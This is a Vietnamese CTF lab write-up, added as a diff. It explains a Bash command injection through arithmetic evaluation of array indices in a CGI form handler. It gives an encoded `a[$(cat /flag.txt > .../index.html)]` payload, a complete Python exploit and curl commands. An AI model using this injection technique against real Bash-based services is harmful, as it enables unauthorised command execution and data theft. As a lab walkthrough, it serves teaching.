@@ -1,0 +1,108 @@
+
+
+
+Để khai thác cờ (flag) từ bài lab này, chúng ta cần lợi dụng lỗ hổng **Command Injection thông qua quá trình đánh giá biểu thức toán học (Arithmetic Evaluation) của Bash**. 
+
+Dưới đây là từng bước phân tích và cách thức khai thác chi tiết.
+
+### 1. Phân tích lỗ hổng
+Trong file `application.sh`, sau khi đọc và giải mã dữ liệu form, script sẽ kiểm tra các trường yêu cầu, trong đó có một đoạn kiểm tra `graduation_year`:
+
+```bash
+if [[ "${form_data[graduation_year]}" -lt 2026 ]]; then
+    echo "Invalid graduation year"
+    return
+fi
+```
+Lỗ hổng nằm ở toán tử `-lt` bên trong cú pháp `[[ ... ]]`. Trong Bash, khi dùng các toán tử so sánh số như `-lt` (less than) hoặc `-gt` (greater than), chuỗi ở bên trái sẽ bị ép **đánh giá như một biểu thức toán học** (Arithmetic Evaluation).
+
+Mặc dù từ bản Bash 5.2 trở đi, việc gọi command substitution `$()` trực tiếp bên trong biểu thức toán học đã bị ngăn chặn. Tuy nhiên, nếu bạn gán chuỗi dưới dạng một **chỉ số mảng (array index)**, thì Bash lại cho phép thực thi `command substitution` khi tính toán chỉ số đó. 
+
+Do đó, nếu ta gán giá trị của `graduation_year` là `a[$(lệnh_của_bạn)]`, Bash sẽ cố gắng thực thi lệnh đó.
+
+### 2. Kịch bản khai thác
+Cấu hình Dockerfile cho thấy file `index.html` được cấp quyền cho người dùng `www-data` (trùng với quyền thực thi của CGI script).
+```dockerfile
+COPY --chown=www-data index.html index.css /usr/local/apache2/htdocs/
+```
+Vì vậy, chúng ta hoàn toàn có quyền sử dụng Command Injection để đọc file `/flag.txt` và ghi đè nội dung của nó ra file `index.html`. Sau đó, chỉ cần truy cập trực tiếp vào `index.html` bằng một request thứ hai để lấy cờ.
+
+Payload thực thi lệnh của chúng ta sẽ là:
+```bash
+a[$(cat /flag.txt > /usr/local/apache2/htdocs/index.html)]
+```
+
+### 3. Vượt qua bộ giải mã `urldecode` và các Regex
+Hàm `urldecode` tự chế của ứng dụng hoạt động dựa trên thay thế chuỗi:
+```bash
+function urldecode() { 
+	: "${1//+/ }"
+	echo -e "${_//%/\\x}"	
+}
+```
+Nó thay thế dấu `+` thành khoảng trắng và `%XX` thành `\xXX` rồi in ra bằng lệnh `echo -e`. Để payload của chúng ta đi qua an toàn:
+- `$` trở thành `%24`
+- `(` trở thành `%28`
+- `)` trở thành `%29`
+- `>` trở thành `%3E`
+- Khoảng trắng trở thành `%20`
+- `/` trở thành `%2F`
+
+Payload hoàn chỉnh sau khi URL Encode:
+`a[%24%28cat%20%2Fflag.txt%20%3E%20%2Fusr%2Flocal%2Fapache2%2Fhtdocs%2Findex.html%29]`
+
+Bên cạnh đó, script yêu cầu email và số điện thoại phải khớp với định dạng:
+- Email: `test@example.com`
+- Phone: `123456`
+
+### 4. Code khai thác tự động (Python Exploit)
+Dưới đây là script Python để gửi payload thực hiện khai thác cờ và tự động đọc về:
+
+```python
+import requests
+
+# Thay thế bằng URL của server mục tiêu
+TARGET_URL = "http://<địa_chỉ_ip_của_lab>" 
+CGI_URL = f"{TARGET_URL}/cgi-bin/application.sh"
+
+# Payload được dựng sẵn
+payload = (
+    "first_name=1&"
+    "last_name=1&"
+    "email=test%40example.com&"
+    "phone=123456&"
+    "resume=1&"
+    "school=1&"
+    "degree=1&"
+    "q1=1&q2=1&q3=1&q4=1&q5=1&"
+    "graduation_year=a[%24%28cat%20%2Fflag.txt%20%3E%20%2Fusr%2Flocal%2Fapache2%2Fhtdocs%2Findex.html%29]"
+)
+
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+print("[*] Gửi payload để chèn mã và ghi đè nội dung file index.html...")
+res = requests.post(CGI_URL, data=payload, headers=headers)
+
+if res.status_code == 200:
+    print("[+] Lệnh đã được thực thi. Tiến hành đọc flag...")
+    
+    # Truy cập file index.html để lấy flag đã bị ghi đè
+    flag_res = requests.get(f"{TARGET_URL}/index.html")
+    print(f"\n[!] FLAG: {flag_res.text.strip()}")
+else:
+    print("[-] Có lỗi xảy ra, status code:", res.status_code)
+```
+
+**Hoặc nếu muốn dùng `curl`, bạn có thể dán đoạn lệnh sau vào Terminal:**
+
+```bash
+# 1. Gửi lệnh chèn mã đọc flag.txt vào index.html
+curl -X POST http://<địa_chỉ_ip_của_lab>/cgi-bin/application.sh \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "first_name=1&last_name=1&email=test@example.com&phone=123456&resume=1&school=1&degree=1&q1=1&q2=1&q3=1&q4=1&q5=1&graduation_year=a[%24%28cat%20%2Fflag.txt%20%3E%20%2Fusr%2Flocal%2Fapache2%2Fhtdocs%2Findex.html%29]"
+
+# 2. Đọc file index.html (nay đã chứa flag)
+curl http://<địa_chỉ_ip_của_lab>/index.html
+```
